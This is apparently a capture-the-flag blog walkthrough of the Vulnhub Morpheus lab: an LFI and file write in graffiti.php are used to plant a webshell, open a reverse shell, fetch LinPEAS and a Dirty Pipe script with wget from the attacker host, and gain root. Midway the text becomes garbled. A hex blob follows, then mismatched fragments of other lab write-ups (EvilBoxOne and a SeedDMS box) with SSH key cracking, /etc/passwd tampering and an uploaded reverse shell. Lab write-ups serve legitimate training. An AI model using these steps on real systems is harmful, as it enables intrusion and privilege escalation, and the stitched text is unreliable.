# Vulnhub Matrix-breakout-2-Morpheus


Vulnhub Training Walkthrough -- Matrix-breakout-2-Morpheus

<!--more-->

## Knowledge

- LFI -- Local File Include
- LinPEAS -- 
- Dirty-Pipe CVE-2022-0847
- php://filter

## 1. Environment Setup

Download the [OVA file](https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova), import into VMware and just run.

## 2. Reconnaisence

### 1. IP Address

arp-scan scanner:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
172.16.86.153	00:0c:29:f6:3b:cd	(Unknown)
172.16.86.254	00:50:56:ed:8a:52	(Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded
```

Target IP is 172.16.86.152.

### 2. Port Info

Scan the port and service:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST
Nmap scan report for 172.16.86.153
Host is up (0.00033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Morpheus:1
81/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
|_http-title: 401 Authorization Required
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
```

Port and service:

| port | service             |
| ---- | ------------------- |
| 22   | ssh                 |
| 80   | Apache httpd 2.4.51 |
| 81   | nginx 1.18.0        |

Access the 80 webpage:

![image-20231115102052270](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png)

The source of page is:

```shell
<html>
	<head><title>Morpheus:1</title></head>
	<body>
		Welcome to the Boot2Root CTF, Morpheus:1.
		<p>
		You play Trinity, trying to investigate a computer on the 
		Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
		<p>
		Good luck!

		- @jaybeale from @inguardians
		<p>
		<img src="trinity.jpeg">
	</body>
</html>

```

The picture is normal.

Access the 81 port:

![image-20231115102156307](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png)

Has a login page, but we have no name and password. The username maybe is `Trinity` or `Cypher`.

### 3. Web Directory

Scan the web directory:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.153
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 348]
/.html                (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.153/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.txt         (Status: 200) [Size: 139]
/graffiti.php         (Status: 200) [Size: 451]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

We can find `robots.txt`, `graffiti.txt` and `graffiti.php` file, just look at it.

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.153/robots.txt
There's no white rabbit here.  Keep searching!
                                                                              
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.153/graffiti.txt
Mouse here - welcome to the Nebby!

Make sure not to tell Morpheus about this graffiti wall.
It's just here to let us blow off some steam.

```

![image-20231115142554473](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png)

We found a message input box.

## 3. Exploit

Now, let's test `graffiti.php` with burp:

![image-20231115142725188](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png)

As we can see, when we text in message box, the server will return the `graffiti.txt` file, and what we input in message box will be accour here. So, here has a LFI vulnerability.

### 1. LFI

We can check out the `graffiti.php ` source code with php:filter through the LFI:

![image-20231115143317154](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png)

Decode with base64 and then got the source code:

```shell
<?php

$file="graffiti.txt";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['file'])) {
       $file=$_POST['file'];
    }
    if (isset($_POST['message'])) {
        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
        fwrite($handle, $_POST['message']);
	fwrite($handle, "\n");
        fclose($file); 
    }
}

// Display file
$handle = fopen($file,"r");
while (!feof($handle)) {
  echo fgets($handle);
  echo "<br>\n";
}
fclose($handle);
?>
```

We fill the `file` parameter with `php://filter/read=convert.base64-encode/resource=graffiti.php`, and we got the source code of `graffiti.php`.

### 2. Upload the webshell

In the source code of `graffiti.php`, we can find that the `$file` variable with replaced with the POST's parameter `file`, and then write the `message` we inputed into the `file`. So, we can use it write a webshell here:

![image-20231115144010659](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png)

And then connect it with AntSword:

![image-20231115144659387](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png)

### 3. Get the reverse shell

And then we user a php reverse shell to get shell:

![image-20231115150726321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png)

And then switch the shell by python:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")';
www-data@morpheus:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@morpheus:/$ ls
ls
FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
www-data@morpheus:/$ cat FLAG.txt
cat FLAG.txt
Flag 1!

You've gotten onto the system.  Now why has Cypher locked everyone out of it?

Can you find a way to get Cypher's password? It seems like he gave it to
Agent Smith, so Smith could figure out where to meet him.

Also, pull this image from the webserver on port 80 to get a flag.

/.cypher-neo.png
```

## 4. Privilege Escalation

Now, we need to get root. We can find two user in home:

```shell
www-data@morpheus:/$ ls /home
ls /home
cypher	trinity
www-data@morpheus:/$ find / -user cypher -type f 2>/dev/null
find / -user cypher -type f 2>/dev/null
/FLAG.txt
www-data@morpheus:/$ find / -user trinity -type f 2>/dev/null
find / -user trinity -type f 2>/dev/null
/home/trinity/.bash_logout
/home/trinity/.bashrc
/home/trinity/.profile
```

Nothing useful. Let's use LinPEAS:

```shell
www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
wget http://172.16.86.138:8080/LinPEAS.sh
--2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
Connecting to 172.16.86.138:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847815 (828K) [text/x-sh]
Saving to: ‘LinPEAS.sh’

LinPEAS.sh          100%[===================>] 827.94K  --.-KB/s    in 0.04s

2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815]

www-data@morpheus:/var/www/html$ ls
ls
LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
graffiti.php  index.html    robots.txt		   trinity.jpeg
www-data@morpheus:/var/www/html$ ls -la
ls -la
total 1284
drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:35 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rw-rw-rw- 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
chmod +x LinPEAS.sh

```

We can find something useful:

![image-20231115155130030](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png)

We can use Dirty-Pipe to get root. The [exploit](https://github.com/imfiver/CVE-2022-0847). Download it and then execute:

```shell
www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
wget http://172.16.86.138:8080/dirty_pipe.sh
--2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
Connecting to 172.16.86.138:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4855 (4.7K) [text/x-sh]
Saving to: ‘dirty_pipe.sh’

dirty_pipe.sh       100%[===================>]   4.74K  --.-KB/s    in 0s

2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855]

www-data@morpheus:/var/www/html$ ls -la
ls -la
total 1292
drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:47 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rwxrwxrwx 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
-rw-rw-rw- 1 www-data www-data   4855 Nov 15 03:32 dirty_pipe.sh
-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
chmod +x dirty_pipe.sh
www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
./dirty_pipe.sh
/etc/passwd已备份到/tmp/passwd
It worked!

# 恢复原来的密码
rm -rf /etc/passwd
mv /tmp/passwd /etc/passwd
root@morpheus:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@morpheus:/var/www/html# ls /root
ls /root
FLAG.txt
root@morpheus:/var/www/html# cat /root/FLAG.txt
cat /root/FLAG.txt
You've won!

Let's hope Matrix: Resurrections rocks!
```

## Attack Path

scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation

23293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854

┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (hash)
1g 0:00:00:00 DONE (2023-11-12 22:59) 100.0g/s 124200p/s 124200c/s 124200C/s unicorn
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we can login ssh with id_rsa.

### 4. login ssh

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ ssh mowree@172.16.86.147 -i hash
Enter passphrase for key 'hash':
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ id
uid=1000(mowree) gid=1000(mowree) groups=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

## 4. Privilege Escalation

Now we have normal username and can login ssh, we need to be root.

Find some application with root privilege:

```shell
mowree@EvilBoxOne:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
```

We has not found somenthing special. Return `/etc/passwd`:

```shell
mowree@EvilBoxOne:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mowree@EvilBoxOne:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd
```

Everyone can modify the `/etc/passwd`, 

So we can consider remove root's passwd, just remove `x` character. But it doesn't work.

Ok, change the root's passwd. Because the root's passwd is stored in `/etc/shadow` file, so here is `x` . We can just change `x` to password's MD5 hash,and then can change root's password.

```shell
mowree@EvilBoxOne:~$ openssl passwd -1
Password:								--> root's passwd is root
Verifying - Password:		--> root
$1$BVZFyXa8$KD/LR0zYZNZ1w5gurJUy4/
```

Change the root's passwd:

```shell
mowree@EvilBoxOne:~$ vi /etc/passwd
mowree@EvilBoxOne:~$ su
Password:
root@EvilBoxOne:/home/mowree# id
uid=0(root) gid=0(root) groups=0(root)
root@EvilBoxOne:/home/mowree# ls -la /root
total 24
drwx------  3 root root 4096 Aug 16  2021 .
drwxr-xr-x 18 root root 4096 Aug 16  2021 ..
lrwxrwxrwx  1 root root    9 Aug 16  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 Aug 16  2021 .bashrc
drwxr-xr-x  3 root root 4096 Aug 16  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   31 Aug 16  2021 root.txt
root@EvilBoxOne:/home/mowree# cat /root/root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

So, that;s all.

## Notes


ndatoryWorkflow |
| tblWorkflowStates            |
| tblWorkflowTransitionGroups  |
| tblWorkflowTransitionUsers   |
| tblWorkflowTransitions       |
| tblWorkflows                 |
| users                        |
+------------------------------+
43 rows in set (0.003 sec)
```

We can find users in table `users`:

```shell
MySQL [seeddms]> select * from users;
+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0.003 sec)
```

the password is plaintext.

We can found users in table `tblUsers`:

![image-20231114193335821](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png)

And we can find a `admin` user and password, try to decrypt the passwd with MD5:

![image-20231114193523530](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png)

Failed. Well, we can try to update the passwd of admin:

![image-20231114193704173](/Users/v4ler1an/Library/Application Support/typora-user-images/image-20231114193704173.png)

Ok, let us login the website:

![image-20231114193829247](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png)

And then, we can use exploit now.

### 3. Exploit the website

We upload a php reverse shell to website:

![image-20231114194413643](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png)

We need to attention at the file ID:

![image-20231114194542518](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png)

Because when we access the shell file, we need to know the id of it:

![image-20231114194932337](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png)

After we upload the file twice, the ID changed to 5.

And then, we can access the shell through uri `/data/1048576/5/shell.php`, and listen on kali:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nc -lvp 1234
listening on [any] 1234 ...
172.16.86.150: inverse host lookup failed: Unknown host
connect to [172.16.86.138] from (UNKNOWN) [172.16.86.150] 55002
Linux ubuntu 5.8.0-59-generic #66~20.04.1-Ubuntu SMP Thu Jun 17 11:14:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 03:56:09 up 43 min,  0 users,  load average: 0.74, 0.22, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## 4. Privilege Escalation

First, turn on the interactive shell with python:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Look up users:

```shell
www-data@ubuntu:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
saket:x:1000:1000:Ubuntu_CTF,,,:/home/saket:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
```

Well, we found the user `saket` which we has seen it in `users` table. Try to switch to it with password `Saket@#$1337` and su to root:

```shell
saket@ubuntu:/$ id
id
uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
saket@ubuntu:/$ sudo -l
sudo -l
[sudo] password for saket: Saket@#$1337

Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
saket@ubuntu:/$ sudo su
sudo su
root@ubuntu:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/# ls /root
ls /root
app.apk  Documents  Music     Public  Templates
Desktop  Downloads  Pictures  snap    Videos
```

## Notes


